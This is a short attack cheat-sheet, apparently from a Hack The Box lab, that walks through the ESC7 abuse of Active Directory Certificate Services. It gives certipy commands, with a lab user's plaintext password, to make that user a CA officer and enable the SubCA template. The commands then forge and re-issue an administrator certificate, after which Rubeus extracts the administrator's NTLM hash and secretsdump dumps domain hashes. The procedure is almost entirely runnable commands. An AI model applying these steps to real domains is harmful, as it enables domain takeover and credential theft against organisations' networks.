## ESC7 type
This attack is used when your user is part of the ManageCA group, use Certify.exe (`Certify.exe find /vulnerable /currentuser`) to find all the vulnerable templates assigned to your user where you are connected from.

1)Use **certipy-ad** to find a vulnerable CA template(sometime Certify.exe fails on that task as it checks only installed certs and not all of them)
2)Add your user to ManageCA certs
```
certipy ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -add-officer raven
```
3)Enable the SubCA template
```
certipy ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -enable-template SubCA
```
4)Request a new certificate(it will fail but save the private key and REQ-ID)
```
certipy req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -template 'SubCA' -upn 'administrator@manager.htb'
```
5)Re-issue the certificate(if will succeed as you are part of ManageCA so you can re-issue any request)
```
certipy ca -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -issue-request 16
```
6)Now download the Certificate submitted from CA
```
certipy req -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' -ca 'manager-DC01-CA' -retrieve 16
```
7)Now use as profit
```
    Upload the administrator.pfx to a Winrm-session and use rubeus to get the NTLM hash: 
    Rubeus.exe asktgt /user:Administrator /certificate:administrator.pfx /getcredentials
    then use that NTLM hash to dump the hashes via secretsdump


    Or use directy the administrator.pfx in certipy(this might not work as sometimes your time and DC are not matching):
    certipy auth -pfx administrator.pfx -domain MANAGER.htb -u Administrator -dc-ip 10.10.11.236

```
